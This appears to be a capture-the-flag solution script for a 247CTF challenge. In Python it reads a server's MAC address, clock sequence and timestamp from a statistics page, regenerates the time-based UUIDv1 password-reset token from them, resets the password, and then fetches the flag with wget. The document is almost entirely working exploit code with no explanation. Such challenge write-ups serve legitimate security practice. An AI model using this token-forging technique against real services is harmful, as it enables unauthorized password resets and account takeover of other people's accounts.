
```python
import numpy as np
import uuid
from datetime import datetime
import pytz
import requests

ENDPOINT = "https://601c86cfbf6dc1f9.247ctf.com"

def r(p):
    response = requests.get(ENDPOINT + p)
    print(response.text)
    return response.text

# https://stackoverflow.com/a/54356039/2558252
def str_to_ns(time_str):
    h, m, s = time_str.split(":")
    int_s, ns = s.split(".")
    ns = map(
        lambda t, unit: np.timedelta64(t, unit),
        [h, m, int_s, ns.ljust(9, "0")],
        ["h", "m", "s", "ns"],
    )
    return sum(ns)

def uuid1(mac, clock_seq, nanoseconds):
    timestamp = nanoseconds // 100 + 0x01B21DD213814000
    time_low = timestamp & 0xFFFFFFFF
    time_mid = (timestamp >> 32) & 0xFFFF
    time_hi_version = (timestamp >> 48) & 0x0FFF
    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3F
    return uuid.UUID(
        fields=(
            time_low,
            time_mid,
            time_hi_version,
            clock_seq_hi_variant,
            clock_seq_low,
            mac,
        ),
        version=1,
    )

r("/update_password")
items = r("/statistics").split()
mac = items[6]
clock_seq = int(items[42])
d = items[50]
t = items[51]
mac = int(mac.replace(":", ""), 16)
date_ns = (
    datetime.strptime(d, "%Y-%m-%d").replace(tzinfo=pytz.UTC).timestamp()
    * 1000
    * 1000
    * 1000
)
time_ns = str_to_ns(t)
ts = int(int(date_ns) + time_ns)
uuid = uuid1(mac, clock_seq, ts)
r("/update_password?reset_code={}&password=test1234".format(uuid))
```

```bash
wget https://601c86cfbf6dc1f9.247ctf.com/get_flag?password=test1234
```
